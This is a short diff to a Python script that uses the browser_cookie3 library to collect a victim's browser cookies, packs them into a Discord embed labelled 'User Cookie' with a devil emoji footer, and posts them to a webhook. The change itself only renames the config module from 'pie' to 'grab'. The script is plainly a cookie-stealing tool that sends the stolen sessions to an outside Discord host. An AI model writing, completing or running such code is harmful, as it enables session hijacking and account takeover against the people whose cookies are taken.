@@ -1,7 +1,7 @@
 from gettext import find
 import browser_cookie3
 from discord_webhook import DiscordWebhook, DiscordEmbed
-import pie.defaults
+import grab.defaults
 
 agent = "Browser"
 
@@ -61,7 +61,7 @@ eb.add_embed_field(name="User Cookie",
                    value="```" + str(find_proper_browser()) + "```")
 eb.set_footer(text=f"😈")
 
-webhook = DiscordWebhook(url=pie.defaults.webhook)
+webhook = DiscordWebhook(url=grab.defaults.webhook)
 
 webhook.add_embed(eb)
 
